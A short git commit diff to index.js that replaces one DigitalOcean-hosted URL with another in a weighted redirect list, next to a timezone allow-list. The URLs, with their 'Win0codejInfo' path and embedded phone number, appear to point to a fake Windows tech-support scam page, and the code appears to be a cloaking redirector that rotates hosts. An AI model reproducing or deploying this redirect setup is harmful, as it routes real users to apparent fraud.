e9323d82466f3f34174553a2526807b4144cc69f
paalakash <palaksh452@gmail.com>
2026-06-06 13:01:43 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://shark-app-2-v9br7.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3990", weight: 1.0 }
+    { url: "https://lionfish-app-hmkkf.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3990", weight: 1.0 }
 
 ];
 
